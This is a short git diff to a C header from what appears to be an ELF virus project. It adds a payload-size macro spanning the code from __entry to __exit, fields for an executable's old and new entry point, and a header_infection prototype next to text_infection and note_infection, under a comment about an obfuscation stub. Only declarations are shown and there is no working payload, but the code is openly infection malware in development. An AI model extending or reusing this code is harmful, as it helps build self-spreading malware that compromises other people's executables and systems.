@@ -13,6 +13,7 @@
 #include <fcntl.h>
 #include <sys/mman.h>
 #include <unistd.h>
+#include <stdbool.h>
 
 ////////////////////////////////////////////////////////////////////////////////
 /// MACROS 
@@ -24,6 +25,8 @@
 
 #define LEFT 0
 #define RIGHT 1
+
+#define PAYLOAD_SIZE (size_t)((void *)__exit - (void *)__entry)
 
 ////////////////////////////////////////////////////////////////////////////////
 /// ENUMS
@@ -53,6 +56,9 @@ struct s_host
 
 	struct s_note *note;
 	struct s_text *text;
+
+	Elf64_Addr old_entry;
+	Elf64_Addr new_entry;
 };
 
 struct s_keychain
@@ -72,6 +78,7 @@ void host_constructor(struct s_host *host, struct s_keychain *keychain, const ch
 void criteria(struct s_host *host, struct s_keychain *keychain);
 void text_infection(struct s_host *host, struct s_keychain *keychain);
 void note_infection(struct s_host *host, struct s_keychain *keychain);
+void header_infection(struct s_host *host, struct s_keychain *keychain);
 void __exit(void);
 
 // STUB (OBFUSCATION)
